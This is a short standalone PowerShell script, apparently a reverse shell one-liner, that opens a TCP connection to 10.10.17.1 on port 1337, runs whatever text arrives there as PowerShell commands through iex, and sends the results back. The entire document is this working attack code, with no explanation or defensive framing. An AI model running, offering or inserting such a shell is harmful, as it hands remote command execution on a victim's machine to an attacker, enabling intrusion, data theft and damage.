$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream();
[byte[]]$bt=0..255|%{0};
while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Length)}
